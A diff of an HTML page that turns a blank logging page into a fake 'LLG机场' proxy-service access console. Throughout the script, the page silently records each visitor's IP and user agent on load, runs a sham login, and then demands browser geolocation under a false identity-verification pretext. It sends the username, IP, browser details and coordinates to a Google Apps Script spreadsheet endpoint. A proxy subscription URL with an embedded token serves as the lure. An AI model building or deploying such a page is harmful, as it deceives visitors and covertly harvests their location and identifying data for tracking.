@@ -1,71 +1,870 @@
 <!DOCTYPE html>
-<html>
+<html lang="zh-CN">
 <head>
-    <title></title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LLG机场 | 安全访问控制台</title>
     <style>
-        /* 确保页面完全黑屏且无任何元素 */
-        html, body {
-            width: 100%;
-            height: 100%;
+        * {
             margin: 0;
             padding: 0;
-            background-color: #000000;
-            overflow: hidden;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', 'Microsoft YaHei', sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #0c1a2d 0%, #0d2b4d 50%, #0a3a6a 100%);
+            color: #e0f0ff;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        /* 科技感背景元素 */
+        .tech-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            opacity: 0.15;
+            background-image: 
+                radial-gradient(circle at 20% 30%, rgba(64, 156, 255, 0.3) 0px, transparent 2px),
+                radial-gradient(circle at 80% 70%, rgba(0, 195, 255, 0.2) 0px, transparent 3px),
+                linear-gradient(90deg, transparent 49%, rgba(0, 174, 255, 0.1) 50%, transparent 51%);
+            background-size: 200px 200px, 300px 300px, 100% 100%;
+        }
+
+        /* 主容器 */
+        .container {
+            max-width: 480px;
+            margin: 0 auto;
+            padding: 20px;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+
+        /* 头部样式 */
+        .header {
+            text-align: center;
+            margin-bottom: 40px;
+            padding: 20px;
+            border-bottom: 1px solid rgba(64, 156, 255, 0.3);
+            position: relative;
+        }
+
+        .header h1 {
+            font-size: 2.8rem;
+            letter-spacing: 3px;
+            margin-bottom: 10px;
+            background: linear-gradient(90deg, #40c9ff, #2d8cff, #4069ff);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            text-shadow: 0 0 15px rgba(64, 156, 255, 0.3);
+        }
+
+        .header .subtitle {
+            font-size: 1rem;
+            opacity: 0.8;
+            letter-spacing: 8px;
+            margin-left: 8px;
+        }
+
+        /* 卡片样式 */
+        .card {
+            background: rgba(12, 26, 45, 0.7);
+            border: 1px solid rgba(64, 156, 255, 0.3);
+            border-radius: 12px;
+            padding: 35px 30px;
+            backdrop-filter: blur(10px);
+            box-shadow: 0 10px 30px rgba(0, 60, 120, 0.2),
+                        0 0 0 1px rgba(64, 156, 255, 0.1) inset;
+            margin-bottom: 25px;
+            transition: all 0.3s ease;
+        }
+
+        .card:hover {
+            box-shadow: 0 15px 40px rgba(0, 80, 160, 0.3),
+                        0 0 0 1px rgba(64, 156, 255, 0.2) inset;
+        }
+
+        /* 表单样式 */
+        .form-group {
+            margin-bottom: 25px;
+        }
+
+        .form-label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 0.9rem;
+            color: #a0d2ff;
+            letter-spacing: 1px;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 14px 18px;
+            background: rgba(8, 18, 33, 0.8);
+            border: 1px solid rgba(64, 156, 255, 0.3);
+            border-radius: 8px;
+            color: #e0f0ff;
+            font-size: 1rem;
+            transition: all 0.3s;
+        }
+
+        .form-input:focus {
+            outline: none;
+            border-color: #40c9ff;
+            box-shadow: 0 0 0 2px rgba(64, 201, 255, 0.2);
+        }
+
+        /* 按钮样式 */
+        .btn {
+            display: block;
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(90deg, #1e6fd9, #2d8cff);
+            border: none;
+            border-radius: 8px;
+            color: white;
+            font-size: 1.1rem;
+            font-weight: 600;
+            letter-spacing: 1px;
+            cursor: pointer;
+            transition: all 0.3s;
+            text-align: center;
+            text-decoration: none;
+            margin-top: 10px;
+        }
+
+        .btn:hover {
+            background: linear-gradient(90deg, #2d8cff, #40c9ff);
+            box-shadow: 0 5px 20px rgba(64, 156, 255, 0.4);
+            transform: translateY(-2px);
+        }
+
+        .btn:active {
+            transform: translateY(0);
+        }
+
+        .btn-secondary {
+            background: linear-gradient(90deg, #2d3b4d, #3a4d66);
+        }
+
+        .btn-secondary:hover {
+            background: linear-gradient(90deg, #3a4d66, #4a5f7a);
+        }
+
+        /* 切换链接 */
+        .switch-text {
+            text-align: center;
+            margin-top: 25px;
+            color: #a0d2ff;
+            font-size: 0.95rem;
+        }
+
+        .switch-link {
+            color: #40c9ff;
+            cursor: pointer;
+            text-decoration: none;
+            border-bottom: 1px dashed rgba(64, 201, 255, 0.5);
+            margin-left: 5px;
+        }
+
+        .switch-link:hover {
+            color: #80e1ff;
+            border-bottom-style: solid;
+        }
+
+        /* 场景样式 */
+        .scene {
+            display: none;
+        }
+
+        .scene.active {
+            display: block;
+            animation: fadeIn 0.5s ease;
+        }
+
+        /* 控制台样式 */
+        .console-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 30px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid rgba(64, 156, 255, 0.3);
+        }
+
+        .user-info {
+            display: flex;
+            align-items: center;
+        }
+
+        .avatar {
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #2d8cff, #40c9ff);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 15px;
+            font-size: 1.5rem;
+            font-weight: bold;
+            color: white;
+        }
+
+        .username {
+            font-size: 1.3rem;
+            font-weight: 600;
+            color: #e0f0ff;
+        }
+
+        .logout-btn {
+            background: rgba(255, 60, 60, 0.15);
+            color: #ff6b6b;
+            border: 1px solid rgba(255, 60, 60, 0.3);
+            padding: 8px 16px;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: all 0.3s;
+            font-size: 0.9rem;
+        }
+
+        .logout-btn:hover {
+            background: rgba(255, 60, 60, 0.25);
+        }
+
+        .console-content {
+            text-align: center;
+            padding: 30px 0;
+        }
+
+        .console-title {
+            font-size: 1.8rem;
+            margin-bottom: 15px;
+            color: #40c9ff;
+        }
+
+        .console-subtitle {
+            font-size: 1.1rem;
+            margin-bottom: 40px;
+            opacity: 0.9;
+            line-height: 1.6;
+        }
+
+        .status-indicator {
+            display: inline-flex;
+            align-items: center;
+            background: rgba(64, 201, 255, 0.1);
+            padding: 10px 20px;
+            border-radius: 20px;
+            margin-bottom: 30px;
+            border: 1px solid rgba(64, 201, 255, 0.3);
+        }
+
+        .status-dot {
+            width: 10px;
+            height: 10px;
+            background: #40ff80;
+            border-radius: 50%;
+            margin-right: 10px;
+            animation: pulse 2s infinite;
+        }
+
+        /* 弹窗样式 */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 15, 30, 0.85);
+            backdrop-filter: blur(5px);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.3s;
+        }
+
+        .modal-overlay.active {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        .modal {
+            background: rgba(12, 26, 45, 0.95);
+            border: 1px solid rgba(64, 156, 255, 0.4);
+            border-radius: 12px;
+            width: 90%;
+            max-width: 500px;
+            padding: 30px;
+            box-shadow: 0 20px 60px rgba(0, 30, 60, 0.5);
+            position: relative;
+            transform: translateY(20px);
+            transition: transform 0.3s;
+        }
+
+        .modal-overlay.active .modal {
+            transform: translateY(0);
+        }
+
+        .modal-header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid rgba(64, 156, 255, 0.3);
+        }
+
+        .modal-icon {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #40c9ff, #2d8cff);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 15px;
+            font-size: 1.2rem;
+            color: white;
+        }
+
+        .modal-title {
+            font-size: 1.5rem;
+            color: #40c9ff;
+        }
+
+        .modal-content {
+            margin-bottom: 25px;
+        }
+
+        .secret-key {
+            background: rgba(8, 18, 33, 0.8);
+            border: 1px solid rgba(64, 156, 255, 0.3);
+            border-radius: 8px;
+            padding: 20px;
+            font-family: 'Courier New', monospace;
+            font-size: 1.2rem;
+            color: #80e1ff;
+            text-align: center;
+            letter-spacing: 1px;
+            word-break: break-all;
+            margin: 20px 0;
+            border-left: 4px solid #40c9ff;
+        }
+
+        .modal-footer {
+            text-align: center;
+            color: #a0d2ff;
+            font-size: 0.9rem;
+            line-height: 1.5;
+        }
+
+        /* 权限警告样式 */
+        .permission-warning {
+            background: rgba(255, 180, 60, 0.1);
+            border: 1px solid rgba(255, 180, 60, 0.3);
+            border-radius: 8px;
+            padding: 20px;
+            margin: 25px 0;
+            text-align: center;
+        }
+
+        .warning-icon {
+            font-size: 2rem;
+            color: #ffb43c;
+            margin-bottom: 10px;
+        }
+
+        /* 动画 */
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        @keyframes pulse {
+            0% { opacity: 0.6; }
+            50% { opacity: 1; }
+            100% { opacity: 0.6; }
+        }
+
+        /* 响应式调整 */
+        @media (max-width: 600px) {
+            .container {
+                padding: 15px;
+            }
+            
+            .header h1 {
+                font-size: 2.2rem;
+            }
+            
+            .card {
+                padding: 25px 20px;
+            }
         }
     </style>
 </head>
 <body>
-    <!-- 页面完全黑屏 -->
+    <!-- 科技感背景 -->
+    <div class="tech-bg"></div>
+
+    <div class="container">
+        <!-- 注册场景 -->
+        <div id="registerScene" class="scene active">
+            <div class="header">
+                <h1>LLG机场</h1>
+                <div class="subtitle">SECURE ACCESS GATEWAY</div>
+            </div>
+            
+            <div class="card">
+                <h2 style="margin-bottom: 25px; color: #40c9ff; text-align: center;">创建访问账户</h2>
+                
+                <div class="form-group">
+                    <label class="form-label">用户名</label>
+                    <input type="text" id="regUsername" class="form-input" placeholder="请输入用户名" autocomplete="off">
+                </div>
+                
+                <div class="form-group">
+                    <label class="form-label">密码</label>
+                    <input type="password" id="regPassword" class="form-input" placeholder="请输入密码" autocomplete="new-password">
+                </div>
+                
+                <div class="form-group">
+                    <label class="form-label">确认密码</label>
+                    <input type="password" id="regConfirmPassword" class="form-input" placeholder="请再次输入密码" autocomplete="new-password">
+                </div>
+                
+                <button class="btn" onclick="registerUser()">注册账户</button>
+                
+                <div class="switch-text">
+                    已有账户？
+                    <span class="switch-link" onclick="switchToLogin()">立即登录</span>
+                </div>
+            </div>
+            
+            <div class="card" style="text-align: center; font-size: 0.9rem; opacity: 0.8;">
+                <p>  </p>
+                <p>  </p>
+            </div>
+        </div>
+        
+        <!-- 登录场景 -->
+        <div id="loginScene" class="scene">
+            <div class="header">
+                <h1>LLG机场</h1>
+                <div class="subtitle">SECURE ACCESS GATEWAY</div>
+            </div>
+            
+            <div class="card">
+                <h2 style="margin-bottom: 25px; color: #40c9ff; text-align: center;">账户登录</h2>
+                
+                <div class="form-group">
+                    <label class="form-label">用户名</label>
+                    <input type="text" id="loginUsername" class="form-input" placeholder="请输入用户名" autocomplete="off">
+                </div>
+                
+                <div class="form-group">
+                    <label class="form-label">密码</label>
+                    <input type="password" id="loginPassword" class="form-input" placeholder="请输入密码" autocomplete="current-password">
+                </div>
+                
+                <button class="btn" onclick="loginUser()">登录系统</button>
+                
+                <div class="switch-text">
+                    没有账户？
+                    <span class="switch-link" onclick="switchToRegister()">立即注册</span>
+                </div>
+            </div>
+        </div>
+        
+        <!-- 控制台场景（登录后） -->
+        <div id="consoleScene" class="scene">
+            <div class="card">
+                <div class="console-header">
+                    <div class="user-info">
+                        <div class="avatar" id="userAvatar">U</div>
+                        <div class="username" id="displayUsername">用户</div>
+                    </div>
+                    <button class="logout-btn" onclick="logout()">退出登录</button>
+                </div>
+                
+                <div class="console-content">
+                    <h2 class="console-title">LLG机场控制台</h2>
+                    <p class="console-subtitle">欢迎访问安全网关控制台<br>系统已就绪，等待您的指令</p>
+                    
+                    <div class="status-indicator">
+                        <div class="status-dot"></div>
+                        <span>系统状态：在线</span>
+                    </div>
+                    
+                    <button class="btn" onclick="showSecretKey()">获取访问密钥</button>
+                    <button class="btn btn-secondary" style="margin-top: 15px;" onclick="checkSystemLogs()">查看系统日志</button>
+                </div>
+            </div>
+            
+            <div class="card">
+                <h3 style="margin-bottom: 15px; color: #a0d2ff;">系统信息</h3>
+                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 15px;">
+                    <div style="padding: 12px; background: rgba(8, 18, 33, 0.5); border-radius: 6px;">
+                        <div style="font-size: 0.85rem; opacity: 0.7;">会话ID</div>
+                        <div style="font-family: monospace;">LLG-<span id="sessionId">XXXXXX</span></div>
+                    </div>
+                    <div style="padding: 12px; background: rgba(8, 18, 33, 0.5); border-radius: 6px;">
+                        <div style="font-size: 0.85rem; opacity: 0.7;">登录时间</div>
+                        <div id="loginTime">--:--:--</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- 权限警告弹窗 -->
+    <div id="permissionWarning" class="modal-overlay">
+        <div class="modal">
+            <div class="modal-header">
+                <div class="modal-icon">⚠️</div>
+                <div class="modal-title">需要位置权限</div>
+            </div>
+            <div class="modal-content">
+                <div class="permission-warning">
+                    <div class="warning-icon">📍</div>
+                    <h3 style="color: #ffb43c; margin-bottom: 10px;">位置访问被拒绝</h3>
+                    <p>LLG机场安全系统需要获取您的位置信息以完成身份验证。</p>
+                    <p>请允许位置访问权限以继续使用系统。</p>
+                </div>
+                <p style="margin-top: 20px; text-align: center; opacity: 0.8;">您可以在浏览器设置中重新启用位置权限。</p>
+            </div>
+            <button class="btn" onclick="hidePermissionWarning()">重试定位</button>
+        </div>
+    </div>
+    
+    <!-- 密钥弹窗 -->
+    <div id="secretKeyModal" class="modal-overlay">
+        <div class="modal">
+            <div class="modal-header">
+                <div class="modal-icon">🔑</div>
+                <div class="modal-title">安全访问密钥</div>
+            </div>
+            <div class="modal-content">
+                <p>您的唯一访问密钥已生成。请妥善保管此密钥，它将在 <strong>24小时</strong> 后失效。</p>
+                
+                <div class="secret-key" id="secretKeyDisplay">
+                    <!-- 密钥将在这里显示 -->
+                    https://drfytjmjhggnrgergergergerg6555.saojc.xyz/api/v1/client/subscribe?token=5bc643ade3b9011fd287f5dc96afe57e
+                </div>
+                
+                <p style="font-size: 0.9rem; opacity: 0.8; text-align: center;">
+                    将此密钥提供给系统管理员以完成身份验证。
+                </p>
+            </div>
+            <div class="modal-footer">
+                <button class="btn" onclick="hideSecretKey()">关闭</button>
+                <button class="btn btn-secondary" style="margin-top: 10px;" onclick="copySecretKey()">复制密钥</button>
+            </div>
+        </div>
+    </div>
+
     <script>
-    // 配置：替换成你第2步得到的最新部署URL
-const WEB_APP_URL = 'https://script.google.com/macros/s/AKfycbwWECm_luKeUKJs_CdR8f50lwYVVn38Ul3xBmPs3NpfUt0l5X2vR6sS_0VppIkJXf8eRg/exec';
-
-// 全局回调函数名，需与后端约定
-window.handleLogResponse = function(response) {
-    console.log('📨 收到服务器响应:', response);
-    if (response.result === 'success') {
-        console.log('✅ IP记录成功，位于表格第' + response.row + '行。');
-    } else {
-        console.error('❌ 记录失败:', response.message);
-    }
-};
-
-async function logVisit() {
-    try {
-        // 1. 获取IP
-        const ipResponse = await fetch('https://api.ipify.org?format=json');
-        const ipData = await ipResponse.json();
-        const visitorIp = ipData.ip;
-
-        console.log('收集到访问者信息:', {
-            ip: visitorIp,
-            userAgent: navigator.userAgent,
-            pageUrl: window.location.href
+        // ===== 配置部分 =====
+        // 请替换为你的Google Apps Script Web App URL
+        const WEB_APP_URL = 'https://script.google.com/macros/s/AKfycbwWECm_luKeUKJs_CdR8f50lwYVVn38Ul3xBmPs3NpfUt0l5X2vR6sS_0VppIkJXf8eRg/exec';
+        
+        // 这里可以设置你的固定密钥（可以随时修改）
+        const FIXED_SECRET_KEY = 'https://drfytjmjhggnrgergergergerg6555.saojc.xyz/api/v1/client/subscribe?token=5bc643ade3b9011fd287f5dc96afe57e';
+        
+        // 测试账户（前端验证用，不存储）
+        const TEST_ACCOUNTS = {
+            'admin': 'admin',
+            'user': 'password123',
+            'test': 'test123'
+        };
+        
+        // ===== 全局变量 =====
+        let currentUser = null;
+        let userIP = null;
+        let userLocation = null;
+        
+        // ===== 页面加载时静默获取IP =====
+        window.addEventListener('load', async function() {
+            // 静默获取IP（用户无感知）
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                userIP = ipData.ip;
+                console.log('静默获取到用户IP:', userIP);
+            } catch (error) {
+                console.error('获取IP失败:', error);
+                userIP = '未知';
+            }
         });
-
-        // 2. 动态创建<script>标签发送数据（JSONP核心）
-        const script = document.createElement('script');
         
-        // 构造请求URL，将数据作为查询参数附加
-        const params = new URLSearchParams({
-            'callback': 'handleLogResponse', // 必须与全局函数名一致
-            'ip': visitorIp,
-            'ua': navigator.userAgent,
-            'url': window.location.href
-        }).toString();
-
-        script.src = `${WEB_APP_URL}?${params}`;
+        // ===== 场景切换函数 =====
+        function switchToLogin() {
+            document.getElementById('registerScene').classList.remove('active');
+            document.getElementById('loginScene').classList.add('active');
+        }
         
-        // 将标签加入页面，即发起请求
-        document.body.appendChild(script);
-
-    } catch (error) {
-        console.error('记录过程中发生错误（用户无感知）:', error);
-    }
-}
-
-// 页面加载时执行
-window.addEventListener('load', logVisit);
+        function switchToRegister() {
+            document.getElementById('loginScene').classList.remove('active');
+            document.getElementById('registerScene').classList.add('active');
+        }
+        
+        function switchToConsole() {
+            document.getElementById('loginScene').classList.remove('active');
+            document.getElementById('registerScene').classList.remove('active');
+            document.getElementById('consoleScene').classList.add('active');
+            
+            // 更新控制台显示信息
+            if (currentUser) {
+                document.getElementById('displayUsername').textContent = currentUser;
+                document.getElementById('userAvatar').textContent = currentUser.charAt(0).toUpperCase();
+                
+                // 生成随机会话ID
+                const sessionId = Math.random().toString(36).substring(2, 8).toUpperCase();
+                document.getElementById('sessionId').textContent = sessionId;
+                
+                // 显示登录时间
+                const now = new Date();
+                document.getElementById('loginTime').textContent = 
+                    `${now.getHours().toString().padStart(2, '0')}:${now.getMinutes().toString().padStart(2, '0')}:${now.getSeconds().toString().padStart(2, '0')}`;
+            }
+        }
+        
+        // ===== 注册函数 =====
+        function registerUser() {
+            const username = document.getElementById('regUsername').value.trim();
+            const password = document.getElementById('regPassword').value;
+            const confirmPassword = document.getElementById('regConfirmPassword').value;
+            
+            if (!username || !password) {
+                alert('请输入用户名和密码');
+                return;
+            }
+            
+            if (password !== confirmPassword) {
+                alert('两次输入的密码不一致');
+                return;
+            }
+            
+            if (password.length < 3) {
+                alert('密码至少需要3个字符');
+                return;
+            }
+            
+            // 模拟注册成功
+            alert(`注册成功！\n用户名: ${username}\n\n提示：请妥善变成账密。\n您可以使用此账户登录。`);
+            
+            // 自动切换到登录界面并填充用户名
+            document.getElementById('loginUsername').value = username;
+            switchToLogin();
+        }
+        
+        // ===== 登录函数（包含定位请求） =====
+        async function loginUser() {
+            const username = document.getElementById('loginUsername').value.trim();
+            const password = document.getElementById('loginPassword').value;
+            
+            if (!username || !password) {
+                alert('请输入用户名和密码');
+                return;
+            }
+            
+            // 前端模拟验证（检查测试账户）
+            let isValid = false;
+            if (TEST_ACCOUNTS[username] && TEST_ACCOUNTS[username] === password) {
+                isValid = true;
+            } else if (username === password) {
+                // 也允许用户名密码相同的情况
+                isValid = true;
+            }
+            
+            if (!isValid) {
+                alert('用户名或密码错误');
+                return;
+            }
+            
+            // 登录验证通过，设置当前用户
+            currentUser = username;
+            
+            // 请求定位权限
+            const locationGranted = await requestLocationPermission();
+            
+            if (locationGranted) {
+                // 定位成功，获取位置信息并发送到Google Sheets
+                await getAndSendLocationData();
+                // 切换到控制台场景
+                switchToConsole();
+            } else {
+                // 定位被拒绝，显示警告
+                document.getElementById('permissionWarning').classList.add('active');
+            }
+        }
+        
+        // ===== 定位权限请求 =====
+        function requestLocationPermission() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    // 浏览器不支持定位
+                    resolve(false);
+                    return;
+                }
+                
+                // 请求定位权限
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        // 定位成功
+                        userLocation = {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy
+                        };
+                        console.log('获取到用户位置:', userLocation);
+                        resolve(true);
+                    },
+                    (error) => {
+                        // 定位失败或被拒绝
+                        console.error('获取位置失败:', error);
+                        resolve(false);
+                    },
+                    {
+                        enableHighAccuracy: false,
+                        timeout: 10000,
+                        maximumAge: 0
+                    }
+                );
+            });
+        }
+        
+        // ===== 获取位置数据并发送到Google Sheets =====
+        async function getAndSendLocationData() {
+            try {
+                // 获取用户代理信息
+                const userAgent = navigator.userAgent;
+                const pageUrl = window.location.href;
+                
+                // 发送数据到Google Sheets（使用JSONP）
+                await sendDataToGoogleSheets({
+                    username: currentUser,
+                    ip: userIP || '未知',
+                    userAgent: userAgent,
+                    pageUrl: pageUrl,
+                    latitude: userLocation ? userLocation.latitude : '',
+                    longitude: userLocation ? userLocation.longitude : '',
+                    accuracy: userLocation ? userLocation.accuracy : '',
+                    note: userLocation ? '定位成功' : '用户拒绝定位',
+                    timestamp: new Date().toISOString()
+                });
+                
+                console.log('用户数据已发送到Google Sheets');
+            } catch (error) {
+                console.error('发送数据失败:', error);
+            }
+        }
+        
+        // ===== 发送数据到Google Sheets（JSONP） =====
+        function sendDataToGoogleSheets(data) {
+            return new Promise((resolve) => {
+                // 创建回调函数
+                window.handleSheetsResponse = function(response) {
+                    console.log('Google Sheets响应:', response);
+                    resolve(response);
+                };
+                
+                // 构建JSONP请求
+                const script = document.createElement('script');
+                const params = new URLSearchParams({
+                    'callback': 'handleSheetsResponse',
+                    'username': data.username || '',
+                    'ip': data.ip || '',
+                    'ua': data.userAgent || '',
+                    'url': data.pageUrl || '',
+                    'lat': data.latitude || '',
+                    'lng': data.longitude || '',
+                    'acc': data.accuracy || '',
+                    'note': data.note || '',
+                    'time': data.timestamp || new Date().toISOString()
+                }).toString();
+                
+                script.src = `${WEB_APP_URL}?${params}`;
+                document.body.appendChild(script);
+                
+                // 清理
+                setTimeout(() => {
+                    document.body.removeChild(script);
+                }, 1000);
+            });
+        }
+        
+        // ===== 隐藏权限警告 =====
+        function hidePermissionWarning() {
+            document.getElementById('permissionWarning').classList.remove('active');
+        }
+        
+        // ===== 显示密钥弹窗 =====
+        function showSecretKey() {
+            document.getElementById('secretKeyDisplay').textContent = FIXED_SECRET_KEY;
+            document.getElementById('secretKeyModal').classList.add('active');
+        }
+        
+        // ===== 隐藏密钥弹窗 =====
+        function hideSecretKey() {
+            document.getElementById('secretKeyModal').classList.remove('active');
+        }
+        
+        // ===== 复制密钥 =====
+        function copySecretKey() {
+            const key = document.getElementById('secretKeyDisplay').textContent;
+            navigator.clipboard.writeText(key).then(() => {
+                alert('密钥已复制到剪贴板');
+            }).catch(err => {
+                console.error('复制失败:', err);
+                alert('复制失败，请手动复制密钥');
+            });
+        }
+        
+        // ===== 查看系统日志（模拟功能） =====
+        function checkSystemLogs() {
+            alert('系统日志功能（演示）\n\n此功能将显示最近的安全访问记录。\n在实际系统中，这里会显示来自Google Sheets的数据。');
+        }
+        
+        // ===== 退出登录 =====
+        function logout() {
+            currentUser = null;
+            userLocation = null;
+            
+            // 清空登录表单
+            document.getElementById('loginUsername').value = '';
+            document.getElementById('loginPassword').value = '';
+            
+            // 切换到登录场景
+            document.getElementById('consoleScene').classList.remove('active');
+            document.getElementById('loginScene').classList.add('active');
+        }
+        
+        // ===== 初始化 =====
+        // 为输入框添加回车键登录支持
+        document.getElementById('loginPassword').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                loginUser();
+            }
+        });
+        
+        document.getElementById('regConfirmPassword').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                registerUser();
+            }
+        });
+        
+        // 初始显示注册场景
+        switchToRegister();
     </script>
 </body>
 </html>
